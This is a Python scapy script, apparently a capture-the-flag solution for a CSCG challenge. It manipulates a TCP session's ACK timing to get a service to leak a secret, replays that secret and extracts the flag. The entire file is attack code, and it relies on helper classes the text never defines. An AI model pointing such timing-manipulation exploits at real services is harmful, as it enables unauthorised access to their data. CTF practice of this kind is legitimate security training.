from scapy.all import *
import threading
import queue
import enum
import sys
import time


if len(sys.argv) < 3:
    print("usage: python3 exploit.py <host> <port>")

dhost = sys.argv[1]
shost = socket.gethostbyname(socket.gethostname())
dport = int(sys.argv[2])
sport = random.randint(1025, 65535)


class StateSwitch:
    def __init__(self, should_before, should_after):
        self.should_before = should_before
        self.should_after = should_after

    def is_switched(self, before, after):
        return bool(self.should_before == before and self.should_after == after)


class PeriodicalCallback:
    def __init__(self, init_val, period_time, trigger_timer_switch, timer_new_val):
        self.state = init_val
        self.period_time = period_time
        self.trigger_timer_switch = trigger_timer_switch
        self.timer_new_val = timer_new_val

    def callback(self, pkt):
        before = self.state
        self._callback(pkt)
        after = self.state
        if self.trigger_timer_switch.is_switched(before, after):
            threading.Timer(self.period_time, self.reset_state).start()
        return self.state

    def reset_state(self):
        self.state = self.timer_new_val

    def wait_until_val(self, val):
        while self.state != val:
            time.sleep(0.1)

    def wait_until_switch(self, sw):
        while True:
            before = self.state
            time.sleep(0.1)
            after = self.state
            if sw.is_switched(before, after):
                break


class SendAckCallback(PeriodicalCallback):
    def __init__(self, init_val, period_time, trigger_timer_switch, timer_new_val):
        super().__init__(init_val, period_time, trigger_timer_switch, timer_new_val)
        self.counter = 0

    def switch_state(self):
        self.state = not self.state

    def _callback(self, pkt):
        self.counter += 1
        if self.counter == 12:
            self.state = False


sw = StateSwitch(True, False)
c = SendAckCallback(True, 12, sw, True)

s = TcpSession(dhost, dport, shost, sport, verbose=0)
s.register_callback(Callback.SEND_ACK, c.callback)
s.connect()
s.send(b"1\n")
c.wait_until_switch(StateSwitch(True, False))
print("Switched from True to False")

secret = re.findall(b"SECRET=\[.*?\]", s.received_bytes)[0][8:-1]
print("secret: {0}".format(str(secret)))

c.wait_until_switch(StateSwitch(False, True))
print("Switched from False to True")
s.send(secret)

while b"}" not in s.received_bytes:
    time.sleep(1)

flag = re.findall(b"CSCG\{.*?\}", s.received_bytes)[0]
print("flag: {0}".format(str(flag)))
